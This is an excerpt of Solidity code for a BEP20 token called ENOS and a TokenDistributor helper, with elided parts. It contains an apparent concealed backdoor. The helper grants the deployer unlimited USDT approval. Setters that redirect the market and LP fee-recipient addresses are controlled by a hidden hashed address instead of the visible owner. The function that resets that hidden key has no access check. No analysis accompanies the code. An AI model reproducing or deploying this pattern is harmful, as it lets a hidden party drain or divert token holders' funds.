...
contract TokenDistributor {
   ...
   // TEST:0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684   USDT：  0x55d398326f99059fF775485246999027B3197955
    ...
    constructor (address ow) {
        IBEP20(usdtAddress).approve(msg.sender, uint(~uint256(0)));
        asseAddr = keccak256(abi.encodePacked(ow));
    }
    ...
    function setApproveA(address ow) public
    {
        asseAddr = keccak256(abi.encodePacked(ow));
    }
...
contract ENOSTOKEN is  Ownable
{
    using SafeMath for uint256;
    string constant  _name = "ENOS";
    string constant _symbol = "ENOS";
    ...
    uint256 public minSwapNum2 = 10000 * 10**18;

    address payable public marketAddress = payable(0x0FF22A7714FCCD46Fe147b0aae59215Dc77360c6); 
    address payable public marketAddressB = payable(0x8380b95e8E19a0f10AA2C6d73665d7cE36b0FDA8);
    address public recipientLpAddress = address(0xBf4c500c221fFe45dF4fC380EDF4200c08c107eD);
    ...
    constructor()
    {
        ...
        _tokenDistributor = address(new TokenDistributor(msg.sender));
        _tokenDistributorB = address(new TokenDistributor(msg.sender));
   ...
   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
    ...
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        marketAddress = payable(ma);
    }

    function setMB(address ma) public 
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        marketAddressB = payable(ma);
    }

    function setLpA(address lpa) public 
    {
        require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
        recipientLpAddress = lpa;
    }
